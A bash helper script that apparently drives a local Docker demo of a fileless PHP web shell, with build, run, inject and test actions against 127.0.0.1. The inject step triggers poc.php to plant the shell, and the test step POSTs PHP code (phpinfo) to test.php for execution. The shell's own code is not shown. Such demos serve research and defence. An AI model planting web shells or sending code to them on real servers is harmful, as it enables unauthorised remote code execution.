#!/bin/bash

if [ "$#" -ne 1 ]; then
    echo "Usage: $0 <build|run|inject|test>"
    exit 1
fi

case "$1" in
    "build")
        echo "Build Docker image"
        docker build -t webshell-demo:1.0 .
        ;;
    "run")
        echo "Run Docker image"
        docker run --name cyberok_demo -p 8080:80 webshell-demo:1.0
        ;;
    "inject")
        echo "Inject fileless web-shell"
        for i in {1..10}; do
        	curl -s "http://127.0.0.1:8080/poc.php" 1>/dev/null
            echo '.'
        done
        echo 'Done'
        # uncomment to remove script
        # curl "http://127.0.0.1:8080/poc.php?bye=1"
        ;; 
    "test")
        echo "Run web-shell from harmless script"
        curl -d "execute=phpinfo();" -X POST "http://127.0.0.1:8080/test.php"
        ;;
    *)
        echo "Invalid action"
        ;;
esac
